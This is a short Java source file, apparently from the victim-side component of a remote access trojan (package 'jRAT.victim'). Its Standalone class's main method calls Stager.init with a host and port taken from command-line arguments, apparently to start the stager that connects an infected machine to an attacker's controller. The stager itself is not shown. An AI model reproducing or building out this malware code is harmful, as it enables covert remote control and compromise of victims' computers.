package jRAT.victim;

public class Standalone {

    public static void main(String[] args)
    {
        Stager.init(args[0], Integer.valueOf(args[1]), false);
    }
}
